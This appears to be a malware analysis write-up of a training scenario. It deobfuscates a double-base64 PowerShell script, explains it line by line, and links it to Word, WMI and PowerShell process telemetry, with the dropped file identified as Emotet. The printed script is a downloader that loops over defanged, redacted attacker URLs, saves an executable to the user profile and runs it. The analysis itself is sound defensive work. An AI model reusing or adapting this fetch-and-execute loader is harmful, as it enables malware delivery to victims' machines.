# Scenario #5 Analysis

A script is base64 encoded twice

*[image unavailable]*

Cleaned up the remaining obfuscated script for readability

*[image unavailable]*

Analysis comments along the script

```powershell
#Executing encoded powershell script
powershell -encod

#Sets string
$Ocavp83=*

#Variable declared
$U69bj40=Bnzbv8l;

#creates a new directory
&new-item $env:userprofile\B20DYak\ovPQHo4\ -itemtype directory;

#sets security protocols, force TLS 1.2, 1.1
[Net.ServicePointManager]::“securityprotocol” = ‘tls12, tls11, tls’;

#Sets various variables for obfuscation
$Cu6yh1z = V9ofyxp;
$Hqdwlji=Gb4u01s;

#Prepare download filepath of \B20dyak\Ovpqho4\V9ofyxp.exe
$Hwzq8x1=$env:userprofile + '\B20dyak\Ovpqho4\' + $Cu6yh1z + .exe;
$Utbkli6=Gawjayl;

#creates webclient object
$Aclzb76=& new-object neT.Webclient;

#splits urls
$Qt9bweq=('hxxp://<redacted>.com/wp-admin/Sbp/*hxxp://<redacted>.com/wp-includes/Y/*hxxp://<redacted>.com/wp-content/wer/*hxxp://<redacted>.com/wp-admin/3D/*hxxp://<redacted>.com/wp-content/3e/*hxxp://<another.redacted.domain>.com/sys-cache/XnT/*hxxp://<thefinal.redaction>.com/data/ultimatemember/L/').Split($Ocavp83);

#Download and execute the file from the list of urls
$L535zme=Ds3ue3p;

foreach($E13jews in $Qt9bweq)
	{try{$Aclzb76.“dOWnLoAdFiLe”($E13jews, $Hwzq8x1);
	$Lemfvf4=Pqmkx0g
	If ((Get-Item $Hwzq8x1).“length” -ge 32074) {
		&Invoke-Item $Hwzq8x1
		$Pee0zvq=Gf4qkts
		break
	$M57lgwk=Sija5fg
	} catch{}
}

#Final variable
$E6sxkf2=X3la_wl

```

With the further context of the activity

```text

#Microsoft Word opening a specific documented located in the outlook cache, likely through email as an attachment
Peer Process: c:\program files\microsoft office\office16\winword.exe

#https://www.virustotal.com/gui/file/cf96e4b33280c03dc7c3ba86a55c7eb85bf6fc3941ad1031536023f54d65a20f
Peer MD5: 5f48187825409cbbf797617a991ce4a4

#The commandline activity for the execution of winword
Peer Process CLI:
C:\Program Files\Microsoft Office\Office16\WINWORD.EXE” /n “C:\Users\UserName\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\KW7Y6LC1\Untitled-20201014-H470846.doc” /o “




#WMI possibly being missused, normal system management tasks, not word processing
Parent Process: c:\windows\system32\wbem\wmiprvse.exe

#https://www.virustotal.com/gui/file/a75c85f3b089993e9c042fb82ecb7757e8f460ed8065fc7991caa38a6de0f50c
Parent MD5: 801e8003c257c8f540b20f1e0decd3a6



#Powershell process executing the obfuscated script
Process: c:\windows\system32\windowspowershell\v1.0\powershell.exe

#https://www.virustotal.com/gui/file/908b64b1971a979c7e3e8ce4621945cba84854cb98d76367b791a6e22b5f6d53
Process MD5: cda48fc75952ad12d99e526d0b6bf70a


#Powershell downloaded the file and save or wrote to this exe
Process CLI: powershell -encod ~ the script above ~
Process File Write: c:\users\UserName\b20dyak\ovpqho4\v9ofyxp.exe

#https://www.virustotal.com/gui/file/a4048f7d23b2860f1a26171bf257872cfb03e68100f560a109cffc1ea989fb71 Flagged as Emotet
File MD5: 7ee4feeded88cb104448141ef375be8c


#File written once durreing process, 1 network connection, likely to download from 1 of the obfuscated urls
File modification count: 1
Network connection count: 1
```
